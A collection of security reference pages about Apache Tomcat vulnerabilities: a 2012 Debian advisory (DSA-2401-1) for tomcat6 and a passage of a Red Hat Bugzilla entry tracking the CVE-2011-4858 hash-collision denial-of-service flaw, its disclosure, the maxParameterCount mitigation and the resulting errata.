  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.debian.org_ac7e1013_20250125_074725.html ===


---

[[Date Prev](msg00024.html)][[Date Next](msg00026.html)]
[[Thread Prev](msg00024.html)][[Thread Next](msg00026.html)]
[[Date Index](maillist.html#00025)]
[[Thread Index](threads.html#00025)]

# [SECURITY] [DSA 2401-1] tomcat6 security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 2401-1] tomcat6 security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Thu, 2 Feb 2012 20:29:50 +0100
* *Message-id*: <[[🔎]](/msgid-search/20120202192950.GB7076%40pisco.westfalen.local) [20120202192950.GB7076@pisco.westfalen.local](msg00025.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- -------------------------------------------------------------------------
Debian Security Advisory DSA-2401-1                   security@debian.org
<http://www.debian.org/security/>                        Moritz Muehlenhoff
February 02, 2012                      <http://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : tomcat6
Vulnerability  : several
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2011-1184 CVE-2011-2204 CVE-2011-2526 CVE-2011-3190
                 CVE-2011-3375 CVE-2011-4858 CVE-2011-5062 CVE-2011-5063
                 CVE-2011-5064 CVE-2012-0022

Several vulnerabilities have been found in Tomcat, a servlet and JSP
engine:

CVE-2011-1184 CVE-2011-5062 CVE-2011-5063 CVE-2011-5064

   The HTTP Digest Access Authentication implementation performed
   insufficient countermeasures against replay attacks.

CVE-2011-2204

   In rare setups passwords were written into a logfile.

CVE-2011-2526

   Missing input sanisiting in the HTTP APR or HTTP NIO connectors
   could lead to denial of service.

CVE-2011-3190

   AJP requests could be spoofed in some setups.

CVE-2011-3375

   Incorrect request caching could lead to information disclosure.

CVE-2011-4858 CVE-2012-0022

   This update adds countermeasures against a collision denial of
   service vulnerability in the Java hashtable implementation and
   addresses denial of service potentials when processing large
   amounts of requests.

Additional information can be
found at <http://tomcat.apache.org/security-6.html>

For the stable distribution (squeeze), this problem has been fixed in
version 6.0.35-1+squeeze2.

For the unstable distribution (sid), this problem has been fixed in
version 6.0.35-1.

We recommend that you upgrade your tomcat6 packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <http://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)

iEYEARECAAYFAk8q44UACgkQXm3vHE4uylq9GwCaA8Z39hbJ4oljcJTwK61zNA1k
IYMAnRoJP2BgR1tEV64BMuAuECS0hE/r
=Gx2T
-----END PGP SIGNATURE-----

```

---



=== Content from bugzilla.redhat.com_4318789c_20250126_072051.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D750521)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D750521)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D750521)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 750521

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 750521**](show_bug.cgi?id=750521)
(CVE-2011-4084, CVE-2011-4858)
- [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) tomcat: hash table collisions CPU usage DoS (oCERT-2011-003)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2011-4858 tomcat: hash table collisions CPU usage DoS (oCERT-2011-003)

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2011-4084, CVE-2011-4858 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [751657](show_bug.cgi?id=751657) [751658](show_bug.cgi?id=751658) [751659](show_bug.cgi?id=751659) [751660](show_bug.cgi?id=751660) [751661](show_bug.cgi?id=751661) [751662](show_bug.cgi?id=751662) [751663](show_bug.cgi?id=751663) [751664](show_bug.cgi?id=751664) [751665](show_bug.cgi?id=751665) [751666](show_bug.cgi?id=751666) [771526](show_bug.cgi?id=771526) [771532](show_bug.cgi?id=771532) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [750525](show_bug.cgi?id=750525) [hashdos, oCERT-2011-003](show_bug.cgi?id=770929 "CLOSED ERRATA - Hash table collisions CPU usage DoS (oCERT-2011-003)") [795277](show_bug.cgi?id=795277) [804887](show_bug.cgi?id=804887) [810065](show_bug.cgi?id=810065) [811419](show_bug.cgi?id=811419) | | TreeView+ | [depends on](buglist.cgi?bug_id=750521&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=750521&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2011-11-01 13:21 UTC by Jan Lieskovsky | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-12 14:58 UTC ([History](show_activity.cgi?id=750521)) | | [CC List:](page.cgi?id=fields.html#cclist) | 21 users (show)  aogburn awnuk ccoleman daxiezhi djorm dknox jdennis jlee jpazdziora mfuruta mharmsen mhasko ole.d patrickm pcheung sappleto security-response-team tkramer tromey vdanen yohmura | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2012-06-06 06:18:19 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2012:0041](https://access.redhat.com/errata/RHSA-2012%3A0041) | 0 | normal | SHIPPED\_LIVE | Moderate: jbossweb security update | 2012-01-19 22:21:56 UTC | | Red Hat Product Errata | [RHSA-2012:0074](https://access.redhat.com/errata/RHSA-2012%3A0074) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:17 UTC | | Red Hat Product Errata | [RHSA-2012:0075](https://access.redhat.com/errata/RHSA-2012%3A0075) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:13 UTC | | Red Hat Product Errata | [RHSA-2012:0076](https://access.redhat.com/errata/RHSA-2012%3A0076) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:06 UTC | | Red Hat Product Errata | [RHSA-2012:0077](https://access.redhat.com/errata/RHSA-2012%3A0077) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-01 04:03:02 UTC | | Red Hat Product Errata | [RHSA-2012:0078](https://access.redhat.com/errata/RHSA-2012%3A0078) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Communications Platform 5.1.3 update | 2012-02-01 04:02:57 UTC | | Red Hat Product Errata | [RHSA-2012:0089](https://access.redhat.com/errata/RHSA-2012%3A0089) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Operations Network 2.4.2 update | 2012-02-02 02:57:57 UTC | | Red Hat Product Errata | [RHSA-2012:0091](https://access.redhat.com/errata/RHSA-2012%3A0091) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Enterprise Portal Platform 4.3 CP07 update | 2012-02-03 03:19:04 UTC | | Red Hat Product Errata | [RHSA-2012:0325](https://access.redhat.com/errata/RHSA-2012%3A0325) | 0 | normal | SHIPPED\_LIVE | Important: jbossweb security update | 2012-02-22 10:10:34 UTC | | Red Hat Product Errata | [RHSA-2012:0406](https://access.redhat.com/errata/RHSA-2012%3A0406) | 0 | normal | SHIPPED\_LIVE | Important: JBoss Operations Network 3.0.1 update | 2012-03-20 21:08:42 UTC | | Red Hat Product Errata | [RHSA-2012:0474](https://access.redhat.com/errata/RHSA-2012%3A0474) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat5 security update | 2012-04-11 22:07:09 UTC | | Red Hat Product Errata | [RHSA-2012:0475](https://access.redhat.com/errata/RHSA-2012%3A0475) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat6 security update | 2012-04-11 22:17:21 UTC | | Red Hat Product Errata | [RHSA-2012:0679](https://access.redhat.com/errata/RHSA-2012%3A0679) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat5 security and bug fix update | 2012-05-21 20:28:06 UTC | | Red Hat Product Errata | [RHSA-2012:0680](https://access.redhat.com/errata/RHSA-2012%3A0680) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat5 security and bug fix update | 2012-05-21 20:27:56 UTC | | Red Hat Product Errata | [RHSA-2012:0681](https://access.redhat.com/errata/RHSA-2012%3A0681) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat6 security and bug fix update | 2012-05-21 20:38:23 UTC | | Red Hat Product Errata | [RHSA-2012:0682](https://access.redhat.com/errata/RHSA-2012%3A0682) | 0 | normal | SHIPPED\_LIVE | Moderate: tomcat6 security and bug fix update | 2012-05-21 20:48:57 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=750521#c0)  Jan Lieskovsky    2011-11-01 13:21:09 UTC  ``` Julian Wälde and Alexander Klink reported a way to degrade performance of the Java Hashtable implementation by filling the hash table with keys with identical hash codes - see [bug #750533](show_bug.cgi?id=750533 "CLOSED WONTFIX - CVE-2012-2739 java: hash table collisions CPU usage DoS (oCERT-2011-003)") for details.  This issue can be used to mount an efficient denial of service attack against Tomcat application server, that parses HTTP request parameters to a hash table and hence exposes this problem.  A remote attack could use that to make Tomcat java process use an excessive amount of CPU time by sending a POST request with large amount of parameters which hash to the same value.   ```  [Comment 2](show_bug.cgi?id=750521#c2)  Jan Lieskovsky    2011-11-01 13:29:04 UTC  ``` Acknowledgements:  Red Hat would like to thank oCERT for reporting this issue. oCERT acknowledges Julian Wälde and Alexander Klink as the original reporters.   ```  [Comment 17](show_bug.cgi?id=750521#c17)  Tomas Hoger    2011-12-29 12:26:18 UTC  ``` This issue was presented on 28C3: <http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html>  Details were posted to full-disclosure: <http://seclists.org/fulldisclosure/2011/Dec/477>  oCERT advisory: <http://www.ocert.org/advisories/ocert-2011-003.html>  n.runs advisory (copy of the full-disclosure post): <http://www.nruns.com/_downloads/advisory28122011.pdf>  28C3 slides and recording: <http://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf> <http://www.youtube.com/28c3#p/u/22/R2Cq3CLI6H8>  Another good write-up of the issue: <http://cryptanalysis.eu/blog/2011/12/28/effective-dos-attacks-against-web-application-plattforms-hashdos/>   ```  [Comment 18](show_bug.cgi?id=750521#c18)  Tomas Hoger    2011-12-29 13:18:53 UTC  ``` As the issue is currently not planned to be addressed in the Java hash table implementation (see [bug #750533, comment #12](show_bug.cgi?id=750533#c12 "CLOSED WONTFIX - CVE-2012-2739 java: hash table collisions CPU usage DoS (oCERT-2011-003)")), Tomcat upstream has added a workaround to protect against this issue.  Tomcat patch introduces support for new connectors parameter - maxParameterCount - which limits the number of parameters processed for a single request.  The default value of 10000 is believed to be high enough to not introduce regression for existing applications and should also mitigate the attack sufficiently.  See upstream announcement for details:  <http://markmail.org/thread/jni4gb5biaolh66t>  Related upstream commits in various SVN branches:  tomcat-7.0.x <http://svn.apache.org/viewvc?view=revision&revision=1189899> <http://svn.apache.org/viewvc?view=revision&revision=1190372> <http://svn.apache.org/viewvc?view=revision&revision=1190482> <http://svn.apache.org/viewvc?view=revision&revision=1194917> <http://svn.apache.org/viewvc?view=revision&revision=1195225> <http://svn.apache.org/viewvc?view=revision&revision=1195226> <http://svn.apache.org/viewvc?view=revision&revision=1195537> <http://svn.apache.org/viewvc?view=revision&revision=1195909> <http://svn.apache.org/viewvc?view=revision&revision=1195944> <http://svn.apache.org/viewvc?view=revision&revision=1195951> <http://svn.apache.org/viewvc?view=revision&revision=1195977> <http://svn.apache.org/viewvc?view=revision&revision=1198641> <http://svn.apache.org/viewvc?view=revision&revision=1200184> <http://svn.apache.org/viewvc?view=revision&revision=1200186> <http://svn.apache.org/viewvc?view=revision&revision=1200218> <http://svn.apache.org/viewvc?view=revision&revision=1200318> <http://svn.apache.org/viewvc?view=revision&revision=1200321> <http://svn.apache.org/viewvc?view=revision&revision=1202708> <http://svn.apache.org/viewvc?view=revision&revision=1224665>  tomcat-6.0.x <http://svn.apache.org/viewvc?view=revision&revision=1200601> <http://svn.apache.org/viewvc?view=revision&revision=1206324>  tomcat-5.5x <http://svn.apache.org/viewvc?view=revision&revision=1221282> <http://svn.apache.org/viewvc?view=revision&revision=1224640>   ```  [Comment 19](show_bug.cgi?id=750521#c19)  Tomas Hoger    2011-12-29 17:05:18 UTC  ``` (In reply to [comment #18](show_bug.cgi?id=750521#c18)) > <http://markmail.org/thread/jni4gb5biaolh66t>  As noted in upstream post, maxParameterCount is available in 7.0.23 and 6.0.35, and should be available in 5.5.35 once released.   ```  [Comment 23](show_bug.cgi?id=750521#c23)  Vincent Danen    2012-01-03 20:57:05 UTC  ``` oCERT made a mistake when publishing the CVE name.  The CVE name for this flaw is _not_ [CVE-2011-4084](https://access.redhat.com/security/cve/CVE-2011-4084), it should have been [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858).  I have updated the bug to reflect this.  [CVE-2011-4084](https://access.redhat.com/security/cve/CVE-2011-4084) will not be used.   ```  [Comment 24](show_bug.cgi?id=750521#c24)  David Jorm    2012-01-03 23:50:46 UTC  ``` JBoss Web is affected by this flaw. The impact is restricted by JBoss Web's limit on the total size of a POST message.   ```  [Comment 27](show_bug.cgi?id=750521#c27)  Vincent Danen    2012-01-05 14:39:54 UTC  ``` Upstream announcement:  <http://markmail.org/message/jni4gb5biaolh66t>   ```  [Comment 34](show_bug.cgi?id=750521#c34)  Tomas Hoger    2012-01-17 13:02:34 UTC  ``` (In reply to [comment #18](show_bug.cgi?id=750521#c18))  Patches for [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) overlap with patches for [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022).  > tomcat-6.0.x > <http://svn.apache.org/viewvc?view=revision&revision=1200601> > <http://svn.apache.org/viewvc?view=revision&revision=1206324>  <http://svn.apache.org/viewvc?view=rev&rev=1229027>  > tomcat-5.5x > <http://svn.apache.org/viewvc?view=revision&revision=1221282> > <http://svn.apache.org/viewvc?view=revision&revision=1224640>  <http://svn.apache.org/viewvc?view=rev&rev=1228191>   ```  [Comment 35](show_bug.cgi?id=750521#c35)  Vincent Danen    2012-01-17 23:40:08 UTC  ``` I see no mention of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) at all on the Tomcat site; are they using [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) _instead_ of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) then?  I'm adding the CVE alias to this bug, but we probably should find out whether or not upstream is even using [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) for anything now, or if this is supposed to be two overlapping CVEs.   ```  [Comment 36](show_bug.cgi?id=750521#c36)  Tomas Hoger    2012-01-18 08:34:18 UTC  ``` (In reply to [comment #35](show_bug.cgi?id=750521#c35)) > I see no mention of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) at all on the Tomcat site; are they using > [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) _instead_ of [CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858) then?  No, my understanding is that while fixing hashdos issue ([CVE-2011-4858](https://access.redhat.com/security/cve/CVE-2011-4858)), upstream discovered other issues / inefficiencies in the parameter parsing code.  This is confirmed by the [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) announcement:    <http://markmail.org/thread/c4bvywhk5euqvv7x>    Analysis of the recent hash collision vulnerability identified unrelated   inefficiencies with Apache Tomcat's handling of large numbers of parameters   and parameter values.  All issues were apparently fixed together and the hashdos fix was publicly acknowledged at the same time all other hashdos issues were made public, but these other issues were not mentioned publicly before yesterday announcement.  We should track [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022) via a separate bug.   ```  [Comment 37](show_bug.cgi?id=750521#c37)  errata-xmlrpc    2012-01-19 17:22:30 UTC  ``` This issue has been addressed in following products:     JBoss Enterprise Application Platform 4.3.0 CP10  Via RHSA-2012:0041 <https://rhn.redhat.com/errata/RHSA-2012-0041.html>   ```  [Comment 38](show_bug.cgi?id=750521#c38)  Vincent Danen    2012-01-21 00:03:42 UTC  ``` [Bug #783359](show_bug.cgi?id=783359 "CLOSED ERRATA - CVE-2012-0022 tomcat: large number of parameters DoS") was filed to address [CVE-2012-0022](https://access.redhat.com/security/cve/CVE-2012-0022).   ```  [Comment 41](show_bug.cgi?id=750521#c41)  errata-xmlrpc    2012-01-31 23:04:20 UTC  ``` This issue has been addressed in following products:    JBoss Communications Platform 5.1.3  Via RHSA-2012:0078 <https://rhn.redhat.com/errata/RHSA-2012-0078.html>   ```  [Comment 42](show_bug.cgi?id=750521#c42)  errata-xmlrpc    2012-01-31 23:06:41 UTC  ``` This issue has been addressed in following products:     JBoss Enterprise Web Platform 5.1.2  Via RHSA-2012:0077 <https://rhn.redhat.com/errata/RHSA-2012-0077.html>   ```  [Comment 43](show_bug.cgi?id=750521#c43)  errata-xmlrpc    2012-01-31 23:07:03 UTC  ``` This issue has been addressed in following products:    JBEWP 5 for RHEL 6   JBEWP 5 for RHEL 4   JBEWP 5 for RHEL 5  Via RHSA-2012:0076 <https://rhn.redhat.com/errata/RHSA-2012-0076.html>   ```  [Comment 44](show_bug.cgi?id=750521#c44)  errata-xmlrpc    2012-01-31 23:07:24 UTC  ``` This issue has been addressed in following products:    JBoss Enterprise Application Platform 5.1.2  Via RHSA-2012:0075 <https://rhn.redhat.com/errata/RHSA-2012-0075.html>   ```  [Comment 